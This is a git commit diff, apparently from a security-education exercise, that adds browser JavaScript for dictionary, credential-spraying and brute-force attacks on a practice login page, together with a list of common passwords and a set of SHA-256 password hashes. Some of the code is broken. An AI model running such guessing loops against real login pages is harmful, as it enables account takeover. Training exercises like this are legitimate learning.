da58d2c9b1a5180abce404c1bd923e62e8dbaf81
Junus Ergin <junus91@googlemail.com>
2022-01-18 14:38:11 +0100

    finished all challenges

--- passwords.js
+++ passwords.js
@@ -1,10 +1,10 @@
-let password = [123456, 123456789, 12345, "qwerty", "password", 12345678, 111111, 123123, 1234567890, 1234567, "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", 1234, "qwertyuiop", 123321, "password123", "1q2w3e4r5t", "iloveyou", 654321, 666666, 987654321, 123, "123456a", "qwe123", "1q2w3e4r", 7777777, "1qaz2wsx", "123qwe", "zxcvbnm", 121212, "asdasd", "a123456", 555555, "dragon", 112233, 123123123, "monkey", 11111111, "qazwsx", 159753, "asdfghjkl", 222222, "1234qwer", "qwerty1", 123654, "123abc", "asdfgh", 777777, "aaaaaa", "myspace1", 88888888, "fuckyou", "123456789a", 999999, 888888, "football", "princess", 789456123, 147258369, 1111111, "sunshine", "michael", "computer", "qwer1234", "daniel", 789456, 11111, "abcd1234", "q1w2e3r4", "shadow", 159357, "123456q", 1111, "samsung", "killer", "asd123", "superman", "master", "12345a", "azerty", "zxcvbn", "qazwsxedc", 131313, "ashley", "target123", 987654, "baseball", "qwert", "asdasd123", "qwerty", "soccer", "charlie", "qweasdzxc", "tinkle", "jessica", "q1w2e3r4t5", "asdf", "test1", "1g2w3e4r", "gwerty123", "zag12wsx", "gwerty", 147258, 12341234, "qweqwe", "jordan", "pokemon", "q1w2e3r4t5y6", 12345678910, 1111111111, 12344321, "thomas", "love", "12qwaszx", 102030, "welcome", "liverpool", "iloveyou1", "michelle", 101010, 1234561, "hello", "andrew", "a123456789", "a12345", "Status", "fuckyou1", "1qaz2wsx3edc", "hunter", "princess1", "naruto", "justin", "jennifer", "qwerty12", "qweasd", "anthony", "andrea", "joshua", "asdf1234", "12345qwert", "1qazxsw2", "marina", "love123", 111222, "robert", 10203, "nicole", "letmein", "football1", "secret", 1234554321, "freedom", "michael1", 11223344, "qqqqqq", 123654789, "chocolate", "12345q", "internet", "q1w2e3", "google", "starwars", "mynoob", "qwertyui", 55555, "qwertyu", "lol123", "lovely", "monkey1", "nikita", "pakistan", 7758521, 87654321, 147852, "jordan23", 212121, 123789, 147852369, "123456789q", "qwe", "forever", 741852963, "123qweasd", "123456abc", "1q2w3e4r5t6y", "qazxsw", 456789, 232323, 999999999, "qwerty12345", "qwaszx", 1234567891, 456123, 444444, "qq123456", "xxx"];
+let dictionary = [123456, 123456789, 12345, "qwerty", "password", 12345678, 111111, 123123, 1234567890, 1234567, "qwerty123", "000000", "1q2w3e", "aa12345678", "abc123", "password1", 1234, "qwertyuiop", 123321, "password123", "1q2w3e4r5t", "iloveyou", 654321, 666666, 987654321, 123, "123456a", "qwe123", "1q2w3e4r", 7777777, "1qaz2wsx", "123qwe", "zxcvbnm", 121212, "asdasd", "a123456", 555555, "dragon", 112233, 123123123, "monkey", 11111111, "qazwsx", 159753, "asdfghjkl", 222222, "1234qwer", "qwerty1", 123654, "123abc", "asdfgh", 777777, "aaaaaa", "myspace1", 88888888, "fuckyou", "123456789a", 999999, 888888, "football", "princess", 789456123, 147258369, 1111111, "sunshine", "michael", "computer", "qwer1234", "daniel", 789456, 11111, "abcd1234", "q1w2e3r4", "shadow", 159357, "123456q", 1111, "samsung", "killer", "asd123", "superman", "master", "12345a", "azerty", "zxcvbn", "qazwsxedc", 131313, "ashley", "target123", 987654, "baseball", "qwert", "asdasd123", "qwerty", "soccer", "charlie", "qweasdzxc", "tinkle", "jessica", "q1w2e3r4t5", "asdf", "test1", "1g2w3e4r", "gwerty123", "zag12wsx", "gwerty", 147258, 12341234, "qweqwe", "jordan", "pokemon", "q1w2e3r4t5y6", 12345678910, 1111111111, 12344321, "thomas", "love", "12qwaszx", 102030, "welcome", "liverpool", "iloveyou1", "michelle", 101010, 1234561, "hello", "andrew", "a123456789", "a12345", "Status", "fuckyou1", "1qaz2wsx3edc", "hunter", "princess1", "naruto", "justin", "jennifer", "qwerty12", "qweasd", "anthony", "andrea", "joshua", "asdf1234", "12345qwert", "1qazxsw2", "marina", "love123", 111222, "robert", 10203, "nicole", "letmein", "football1", "secret", 1234554321, "freedom", "michael1", 11223344, "qqqqqq", 123654789, "chocolate", "12345q", "internet", "q1w2e3", "google", "starwars", "mynoob", "qwertyui", 55555, "qwertyu", "lol123", "lovely", "monkey1", "nikita", "pakistan", 7758521, 87654321, 147852, "jordan23", 212121, 123789, 147852369, "123456789q", "qwe", "forever", 741852963, "123qweasd", "123456abc", "1q2w3e4r5t6y", "qazxsw", 456789, 232323, 999999999, "qwerty12345", "qwaszx", 1234567891, 456123, 444444, "qq123456", "xxx"];
 let emails = [
-    'abert.einstein@hacker-email.com',
+    'albert.einstein@hacker-email.com',
     'grace.hopper@hacker-email.com',
     'marie.curie@hacker-email.com',
     'konrad.zuse@hacker-email.com',
-    'stephanie-kwolek @hacker-email.com',
+    'stephanie-kwolek@hacker-email.com',
     'carl-friedrich.auss@hacker-email.com',
     'shirley-ann.jackson@hacker-email.com',
     'gertrude-belle.elion@hacker-email.com',
@@ -15,22 +15,156 @@ let emails = [
 
 let index = 0;
 
-function testPassword() {
-    let currentPassword = passwords[index];
+
+function dictionaryAttack() {
+    let currentPassword = dictionary[index];
     console.log('Testing password', currentPassword);
     index++;
     password.type = 'text';
     password.value = currentPassword;
     loginButton.click();
-    if (index < passwords.length) {
-        setTimeout(testPassword, 500);
+    if (index < dictionary.length) {
+        setTimeout(dictionaryAttack, 500);
+    }
+}
+
+function emailDictionaryAttack(i, j) {
+    console.log('Testing', emails[i], dictionary[j]);
+    password.type = 'text';
+    username.value = emails[i];
+    password.value = dictionary[j];
+    j++;
+
+    if (j >= dictionary.length) {
+        i++;
+        j = 0;
+    }
+
+    if (i < emails.length || j < dictionary.length) {
+        setTimeout(emailDictionaryAttack, 500, i, j);
+    }
+}
+
+let alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
+let indices = [0];
+
+function bruteForceAttack(length) {
+    let combinations = [];
+
+    for (let i = 0; i <= length; i++) {
+        let newSets = combineArrays(Array.from(Array(i)).map(a => alphabet));
+        combinations = [...combinations, ...newSets];
+    }
+    console.log(combinations);
+
+    tryCombinations(combinations)
+        // index++;
+
+    // setTimeout(bruteForceAttack, 500);
+}
+
+function tryCombinations(combinations) {
+    console.log('Trying Password', combinations[index]);
+    password.type = 'text';
+    password.value = combinations[index];
+    loginButton.click();
+    index++;
+    if (index < combinations.length) {
+        setTimeout(tryCombinations, 500, combinations);
     }
 }
 
 
-let alphabet = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z"];
-let combinations = [];
+function combineArrays(array_of_arrays) {
 
-function nextCombination() {
-    let combination = alphabet[index];
+    // First, handle some degenerate cases...
+
+    if (!array_of_arrays) {
+        // Or maybe we should toss an exception...?
+        return [];
+    }
+
+    if (!Array.isArray(array_of_arrays)) {
+        // Or maybe we should toss an exception...?
+        return [];
+    }
+
+    if (array_of_arrays.length == 0) {
+        return [];
+    }
+
+    for (let i = 0; i < array_of_arrays.length; i++) {
+        if (!Array.isArray(array_of_arrays[i]) || array_of_arrays[i].length == 0) {
+            // If any of the arrays in array_of_arrays are not arrays or zero-length, return an empty array...
+            return [];
+        }
+    }
+
+    // Done with degenerate cases...
+
+    // Start "odometer" with a 0 for each array in array_of_arrays.
+    let odometer = new Array(array_of_arrays.length);
+    odometer.fill(0);
+
+    let output = [];
+
+    let newCombination = formCombination(odometer, array_of_arrays);
+
+    output.push(newCombination);
+
+    while (odometer_increment(odometer, array_of_arrays)) {
+        newCombination = formCombination(odometer, array_of_arrays);
+        output.push(newCombination);
+    }
+
+    return output;
 }
+
+// Translate "odometer" to combinations from array_of_arrays
+function formCombination(odometer, array_of_arrays) {
+    // In Imperative Programmingese (i.e., English):
+    // let s_output = "";
+    // for( let i=0; i < odometer.length; i++ ){
+    //    s_output += "" + array_of_arrays[i][odometer[i]]; 
+    // }
+    // return s_output;
+
+    // In Functional Programmingese (Henny Youngman one-liner):
+    return odometer.reduce(
+        function(accumulator, odometer_value, odometer_index) {
+            return "" + accumulator + array_of_arrays[odometer_index][odometer_value];
+        },
+        ""
+    );
+} /* formCombination() */
+
+function odometer_increment(odometer, array_of_arrays) {
+
+    // Basically, work you way from the rightmost digit of the "odometer"...
+    // if you're able to increment without cycling that digit back to zero,
+    // you're all done, otherwise, cycle that digit to zero and go one digit to the
+    // left, and begin again until you're able to increment a digit
+    // without cycling it...simple, huh...?
+
+    for (let i_odometer_digit = odometer.length - 1; i_odometer_digit >= 0; i_odometer_digit--) {
+
+        let maxee = array_of_arrays[i_odometer_digit].length - 1;
+
+        if (odometer[i_odometer_digit] + 1 <= maxee) {
+            // increment, and you're done...
+            odometer[i_odometer_digit]++;
+            return true;
+        } else {
+            if (i_odometer_digit - 1 < 0) {
+                // No more digits left to increment, end of the line...
+                return false;
+            } else {
+                // Can't increment this digit, cycle it to zero and continue
+                // the loop to go over to the next digit...
+                odometer[i_odometer_digit] = 0;
+                continue;
+            }
+        }
+    } /* for( let odometer_digit = odometer.length-1; odometer_digit >=0; odometer_digit-- ) */
+
+} /* odometer_increment() */
--- script.js
+++ script.js
@@ -19,6 +19,12 @@ function checkPassword(password) {
     return sha256(password) == pwdenc[new Date().getDate()];
 }
 
+
+function checkPassword(password) {
+    const pwdenc = ['5994471abb01112afcc18159f6cc74b4f511b99806da59b3caf5a9c173cacfc5', '65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5', '5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8', 'ef797c8118f02dfb649607dd5d3f8c7623048c9c063d532cc95c5ed7a898a64f', 'bcb15f821479b4d5772bd0ca866c00ad5f926e3580720659cc80d39c9d09802a', '96cae35ce8a9b0244178bf28e4966c2ce1b8385723a96a6b838858cdd6ca0a1e', 'c775e7b757ede630cd0aa1113bd102661ab38829ca52a6422ab782862f268646', '8bb0cf6eb9b17d0f7d22b456f121257dc1254e1f01665370476383ea776df414', 'daaad6e5604e8e17bd9f108d91e26afe6281dac8fda0091040a7a6d7bd9b43b5', '91b4d142823f7d20c5f08df69122de43f35f057a988d9619f6d3138485c9a203', 'c0c4a69b17a7955ac230bfc8db4a123eaa956ccf3c0022e68b8d4e2f5b699d1f', 'e69fc66a299ad7fd3303c1480f5f51f94b09a2a25a7dbd42221cfa8ed4c5baca', '6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090', '0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e', '03ac674216f3e15c761ee1a5e255f067953623c8b388b4459e13f978d7c846f4', '9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd', 'a320480f534776bddb5cdb54b1e93d210a3c7d199e80a23c1b2178497b184c76', 'ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f', '28f0116ef42bf718324946f13d787a1d41274a08335d52ee833d5b577f02a32a', 'e4ad93ca07acb8d908a3aa41e920ea4f4ef4f26e7f86cf8291c5db289780a5ae', '481f6cc0511143ccdd7e2d1b1b94faf0a700a8b49cd13922a70b5ae28acaa8c5', '94edf28c6d6da38fd35d7ad53e485307f89fbeaf120485c8d17a43f323deee71', '8a9bcf1e51e812d0af8465a8dbcc9f741064bf0af3b3d08e6b0246437c19f7fb', 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3', 'f707fdda7c874ff49ebfb2c88a2860c5ff4ce3d94a21efb76566ad0f92c9ad57', '18138372fad4b94533cd4881f03dc6c69296dd897234e0cee83f727e2e6b1f63', '72ab994fa2eb426c051ef59cad617750bfe06d7cf6311285ff79c19c32afd236', '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92', '8c1cdb9cb4dbac6dbb6ebd118ec8f9523d22e4e4cb8cc9df5f7e1e499bba3c10', '15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225'];
+    return sha256(password) == pwdenc[new Date().getDate()];
+}
+
 function loginWithPassword() {
     let password = document.getElementById('password').value;
     if (checkPassword(password)) {
@@ -31,7 +37,7 @@ function login() {
     let username = document.getElementById('username').value;
     let password = document.getElementById('password').value;
 
-    if (username == 'Junus' && password == 'StrengGeheim!') {
+    if (username == 'marie.curie@hacker-email.com' && checkPassword2(password)) {
         window.location.href = './login-success.html';
     } else {
         alert('Passwort falsch!');
